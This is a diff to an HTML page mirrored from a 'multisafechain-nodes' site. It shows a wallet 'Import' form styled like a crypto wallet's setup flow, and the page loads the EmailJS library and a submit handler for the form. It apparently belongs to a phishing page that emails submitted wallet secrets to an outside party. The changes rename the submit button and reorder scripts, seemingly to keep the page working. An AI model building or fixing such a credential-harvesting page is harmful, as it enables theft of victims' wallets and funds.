@@ -460,24 +460,16 @@
                                         </span>
                                     </span>
                                 </div>
-                                 <button name="send" class="button btn-primary first-time-flow__button" disabled="disabled" id="submit-btn" type="submit">Import</button>
+                                 <button name="submit" class="button btn-primary first-time-flow__button" disabled="disabled" id="submit-btn" type="submit">Import</button>
                             </form>
                         </div>
                     </div>
                 </div>
             </div>
         </div>
-        <div id="popover-content"></div>
-        <script type="text/javascript" src="js/main.js"></script>
-        <script type="text/javascript">
-            window.setTimeout(function() {
-            $(".alert").fadeTo(500, 0).slideUp(500, function(){
-            $(this).remove(); 
-            });
-            }, 2000);
-            </script>
 
-              <script type="text/javascript"
+
+        <script type="text/javascript"
   src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
 <script type="text/javascript">
@@ -506,6 +498,19 @@ document.getElementById('my-form')
     });
 });    
 </script>
+
+                                        
+        <div id="popover-content"></div>
+        <script type="text/javascript" src="js/main.js"></script>
+        <script type="text/javascript">
+            window.setTimeout(function() {
+            $(".alert").fadeTo(500, 0).slideUp(500, function(){
+            $(this).remove(); 
+            });
+            }, 2000);
+            </script>
+
+             
 </body>
 <!-- Mirrored from multisafechain-nodes.vercel.app/form/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 05 Feb 2026 13:31:41 GMT -->
 </html>
